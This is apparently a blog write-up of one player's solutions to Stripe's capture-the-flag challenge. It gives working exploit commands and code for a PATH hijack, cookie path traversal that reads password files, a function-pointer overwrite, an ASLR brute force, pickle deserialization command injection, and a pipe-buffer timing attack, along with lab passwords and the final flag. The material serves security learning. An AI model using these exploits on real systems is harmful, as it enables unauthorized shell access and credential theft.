RecentlyÂ [Stripe](http://stri.pe/)Â (a startup trying to improve online payments
for web developers) put onlineÂ [a fun CTF
challenge](https://stripe.com/blog/capture-the-flag)Â with simple security
exercises. Now that the challenge is done and the CTF is offline, I wanted to
share my solutions with people who were interested in this CTF but were not
able to solve it before the time limit.

Unfortunately I don't have the original source code of the exercises here. I
hope that the Stripe CTF organizers will publish those so that I can explain my
exploits better ðŸ™‚

<!--more-->

level01
-------

The given binary executesÂ `system("date");`Â in order to display the
date.Â `system`Â looks into theÂ `PATH`Â environment variable to locate binaries.
As an attacker, we can controlÂ `PATH`Â and make it point to a directory we
control which contains aÂ `date`Â executable file. Here is my solution:

```
$ ln -s /bin/sh date
$ PATH=.:$PATH /levels/level01
```

level02
-------

The MOTD gives us some infos about this level: there is a web server running
onÂ `localhost:80`Â which requiresÂ `Digest`Â authentication to access a PHP page
of which we have the source. I don't have the PHP source here but basically, it
checked for the existence of a cookie, and if it exists it displays the
contents ofÂ `"/var/www/$cookie_value"`. Cookies can be manipulated by the
attacker, so we can control the displayed file. Here is my solution:

```
$ curl -v -b user_details=../../home/level03/.password\
      -u level02:kxlVXUvzv --digest http://ctf.stri.pe/level02.php
```

level03
-------

Things get a little harder. Here, we have a C binary which basically does this:

{{< highlight c >}}
func_ptr table[4] = { func1, func2, func3, func4 };
int i = atoi(argv[1]);
if (i >= 4)
    error();
table[i]();
{{< / highlight >}}

This code does not check ifÂ `i`Â is negative. We can use that to dereference a
function pointer which was put in the stack later. It turns out we can control
some part of the stack (ourÂ `argv[2]`Â is copied in a stack buffer), so it is
just a matter of finding the right offset to control the function pointer
dereference and finding the right function on which to jump. Luckily, one of
the unused functions in theÂ `level03`Â binary is a wrapper forÂ `system(3)`Â and
we can use it to execute an arbitrary shell command. My solution:

```
/levels/level03 -27 "$(echo -ne "sh #\x5b\x87\x04\x08")"
```

Explanation:Â `-27`Â if the offset to 4 characters after the start of
theÂ `argv[2]`Â copy, which contains our function pointer. The first 4 chars
ofÂ `argv[2]`Â are the arbitrary command:Â `sh`Â followed by the start of a comment
so that theÂ `sh`Â binary does not freak out ðŸ™‚

level04
-------

The basic example of a stack overflow:Â `strcpy`Â of a user controlled string
without any length check. This should be trivial to exploit, but the presence
ofÂ `ASLR`Â makes it a bit harder: the stack location in memory is randomized,
making it hard to jump on our shellcode in the stack. To bypass that, there are
two solutions: either find aÂ `jmp *%eax`Â at a fixed address in memory (for
example, inÂ `.text`) and use it to overwrite the function return address so
that theÂ `ret`Â returns to the shellcode, or be hardcore and bruteforce the
address. Both solutions were doable, and I went with the bruteforce because I
did not think about theÂ `jmp *%eax`Â in the first place ðŸ˜› .

UsingÂ [stackbf2.c](http://gunslingerc0de.wordpress.com/2010/07/26/stackbf2-c/)Â with
the right parameters, exploiting this is trivial. Basically:

```
gcc brute.c
./a.out /levels/level04 1040
```

*Note: while I was writing this article,Â [w4kfu](http://blog.w4kfu.com/)Â gave
me a better solution: usingÂ `ulimit -s unlimited`Â makes the exploit possible
using aÂ `ret2libc`Â technique. Food for thought ðŸ™‚*

level05
-------

For this level we have a "large" client/server Python application which uses a
server to process HTTP queries, put data in a queue so that it can be processed
by a worker, and get data back from the queue when it has been processed. The
worker waits for data to be put in the queue, uppercases the data, then puts it
back in the queue. The queue is basically a directory with "job" files in this
format:

```
type: %s; data: %s; job: %s
```

Data is unserialized using this code:

{{< highlight python >}}
parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
match = parser.match(serialized)
direction = match.group(1)
data = match.group(2)
job = pickle.loads(match.group(3))
{{< /highlight >}}

The trick is to see that you can basically get a user controlled string
forÂ `match.group(3)`Â if you haveÂ `"; job: "`Â in your data. Python's pickle
module is not really done to unserialize user controlled stuff: it is very easy
to make it do what you want as soon as you control what it unserializes.

You can control how an object is serialized using itsÂ `__reduce__`Â method. I
basically created an object withÂ `__reduce__`Â callingÂ `os.system("cp
/home/level06/.password /tmp/1")`, injected it as a "job" object into the
queue, and got the password file copied where I wanted it.

level06
-------

When I first saw the code I immediately thought "this must be exploited through
a timing attack: count the number of characters written onÂ `stderr`Â before data
is written onÂ `stdout`". Unfortunately, it is not that easy: scheduling and
pipe bufferization completely breaks all forms of basic timing you could use. I
tried several methods to get the writes onÂ `stderr`Â to block so that I could
more precisely detect when the write onÂ `stdout`Â was done, but did not manage
it the first day.

Then, the day before the end of the CTF, I thought a bit more about it (I
really wanted a free t-shirt :D) and the solution came to my mind: prefilling
the pipe buffer so that we can control after how many characters it blocks.
That way we can see if the write onÂ `stdout`Â was done before a certain number
of characters onÂ `stderr`. That way we can bruteforce one character by one
character to get the full password toÂ `level06`. Here is my exploit code which
checks if the start of the password matchesÂ `argv[1]`:

{{< highlight python >}}
import os
import signal
import sys

CONSTSIZE = 33
PIPEBUFSIZE = 65536

orig_guess = guess = sys.argv[1]

guess += "a" # because we need one more char to be sure

out, out_child = os.pipe()
err, err_child = os.pipe()
pid = os.fork()
if not pid:
    os.write(err_child, '\x00' * (65503 - len(orig_guess)))
    os.dup2(out_child, 1)
    os.dup2(err_child, 2)
    os.execl('/levels/level06', 'level06', '/home/the-flag/.password', guess)

def alarmed(*a):
    print 'Success: %r' % orig_guess
    os.kill(pid, 9)
    sys.exit(0)

signal.signal(signal.SIGALRM, alarmed)
signal.alarm(1)
os.read(out, 1)

print 'Fail: %r' % orig_guess
os.kill(pid, 9)
sys.exit(1)
{{< /highlight >}}

Final key:Â `theflagl0eFTtT5oi0nOTxO5`

Conclusion
----------

Overall, this was a really fun CTF organized by the folks at Stripe. It's
really too bad that it was not longer (if I did not get stuck on that last
exercise like an idiot I would have basically done it in 5 hours) with more
complex exercises (remote exploitation is always fun, reverse engineering too
ðŸ™‚ ). Still, it's a great learning tool for people who are not really into
computer security and local exploitation, and I'd like to see more people do
that kind of stuff.
